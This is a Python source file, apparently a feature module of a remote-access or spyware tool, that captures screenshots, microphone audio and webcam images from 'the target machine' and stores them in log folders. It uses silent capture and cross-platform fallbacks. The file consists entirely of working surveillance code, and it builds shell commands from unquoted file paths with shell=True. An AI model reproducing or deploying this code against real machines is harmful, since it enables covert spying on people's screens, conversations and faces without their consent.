################################################
# Screen and Audio Capture Feature Module      #
# Captures screenshots and audio recordings    #
################################################

import os
import subprocess
import platform
from datetime import datetime

# Try to import imaging libraries
try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False


class ScreenCapture:
    """
    Captures screenshots from the target machine.
    Multiple fallback methods for compatibility.
    """
    
    def __init__(self, save_dir='logs/screenshots'):
        self.save_dir = save_dir
        self.system = platform.system()
        os.makedirs(self.save_dir, exist_ok=True)
    
    def capture_screenshot(self, filename=None):
        """Capture a screenshot using available methods"""
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screenshot_{timestamp}.png'
        
        filepath = os.path.join(self.save_dir, filename)
        
        # Try PIL/Pillow first (most reliable)
        if PIL_AVAILABLE:
            try:
                screenshot = ImageGrab.grab()
                screenshot.save(filepath)
                return f"Screenshot saved: {filepath}"
            except Exception as e:
                pass
        
        # Try pyautogui
        if PYAUTOGUI_AVAILABLE:
            try:
                screenshot = pyautogui.screenshot()
                screenshot.save(filepath)
                return f"Screenshot saved: {filepath}"
            except Exception as e:
                pass
        
        # Fallback to system commands
        return self.capture_with_system_command(filepath)
    
    def capture_with_system_command(self, filepath):
        """Capture screenshot using system-specific commands"""
        try:
            if self.system == 'Darwin':  # macOS
                cmd = f'screencapture -x {filepath}'
                subprocess.call(cmd, shell=True)
                if os.path.exists(filepath):
                    return f"Screenshot saved: {filepath}"
            
            elif self.system == 'Linux':
                # Try different Linux screenshot tools
                tools = ['scrot', 'import', 'gnome-screenshot']
                for tool in tools:
                    try:
                        if tool == 'scrot':
                            cmd = f'scrot {filepath}'
                        elif tool == 'import':
                            cmd = f'import -window root {filepath}'
                        elif tool == 'gnome-screenshot':
                            cmd = f'gnome-screenshot -f {filepath}'
                        
                        subprocess.call(cmd, shell=True, timeout=5)
                        if os.path.exists(filepath):
                            return f"Screenshot saved: {filepath}"
                    except:
                        continue
            
            elif self.system == 'Windows':
                # PowerShell screenshot method
                ps_script = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $bitmap.Save("{filepath}")
                '''
                cmd = f'powershell -Command "{ps_script}"'
                subprocess.call(cmd, shell=True, timeout=10)
                if os.path.exists(filepath):
                    return f"Screenshot saved: {filepath}"
            
            return "Failed to capture screenshot: No available method"
        
        except Exception as e:
            return f"Error capturing screenshot: {str(e)}"
    
    def capture_multiple(self, count=5, interval=2):
        """Capture multiple screenshots at intervals"""
        import time
        results = []
        for i in range(count):
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screenshot_{i+1}_{timestamp}.png'
            result = self.capture_screenshot(filename)
            results.append(result)
            if i < count - 1:
                time.sleep(interval)
        return '\n'.join(results)
    
    def list_screenshots(self):
        """List all captured screenshots"""
        try:
            files = os.listdir(self.save_dir)
            screenshots = [f for f in files if f.endswith('.png')]
            if screenshots:
                return '\n'.join(screenshots)
            return "No screenshots found"
        except Exception as e:
            return f"Error listing screenshots: {str(e)}"


class AudioCapture:
    """
    Captures audio from the target machine's microphone.
    """
    
    def __init__(self, save_dir='logs/audio'):
        self.save_dir = save_dir
        self.system = platform.system()
        self.is_recording = False
        os.makedirs(self.save_dir, exist_ok=True)
    
    def record_audio(self, duration=10, filename=None):
        """
        Record audio for specified duration.
        Requires pyaudio or system tools.
        """
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'audio_{timestamp}.wav'
        
        filepath = os.path.join(self.save_dir, filename)
        
        # Try with pyaudio first
        try:
            import pyaudio
            import wave
            
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
            
            frames = []
            for i in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            wf = wave.open(filepath, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            return f"Audio recorded: {filepath}"
        
        except ImportError:
            return self.record_with_system_command(filepath, duration)
        except Exception as e:
            return f"Error recording audio: {str(e)}"
    
    def record_with_system_command(self, filepath, duration):
        """Record audio using system-specific commands"""
        try:
            if self.system == 'Darwin':  # macOS
                cmd = f'sox -d {filepath} trim 0 {duration}'
                subprocess.call(cmd, shell=True, timeout=duration+2)
                if os.path.exists(filepath):
                    return f"Audio recorded: {filepath}"
            
            elif self.system == 'Linux':
                # Try arecord (ALSA)
                cmd = f'arecord -d {duration} -f cd {filepath}'
                subprocess.call(cmd, shell=True, timeout=duration+2)
                if os.path.exists(filepath):
                    return f"Audio recorded: {filepath}"
            
            elif self.system == 'Windows':
                # Windows requires third-party tools or complex PowerShell
                return "Audio recording on Windows requires pyaudio library"
            
            return "Failed to record audio: No available method"
        
        except Exception as e:
            return f"Error recording audio: {str(e)}"
    
    def list_recordings(self):
        """List all audio recordings"""
        try:
            files = os.listdir(self.save_dir)
            recordings = [f for f in files if f.endswith('.wav') or f.endswith('.mp3')]
            if recordings:
                return '\n'.join(recordings)
            return "No recordings found"
        except Exception as e:
            return f"Error listing recordings: {str(e)}"


class WebcamCapture:
    """Captures images from webcam"""
    
    def __init__(self, save_dir='logs/webcam'):
        self.save_dir = save_dir
        os.makedirs(self.save_dir, exist_ok=True)
    
    def capture_image(self, filename=None):
        """Capture image from webcam"""
        try:
            import cv2
            
            if not filename:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f'webcam_{timestamp}.jpg'
            
            filepath = os.path.join(self.save_dir, filename)
            
            # Open webcam
            camera = cv2.VideoCapture(0)
            
            if not camera.isOpened():
                return "Error: Could not access webcam"
            
            # Capture frame
            ret, frame = camera.read()
            
            if ret:
                cv2.imwrite(filepath, frame)
                camera.release()
                return f"Webcam image saved: {filepath}"
            else:
                camera.release()
                return "Error: Could not capture image"
        
        except ImportError:
            return "Error: opencv-python library required. Install with: pip install opencv-python"
        except Exception as e:
            return f"Error capturing webcam image: {str(e)}"
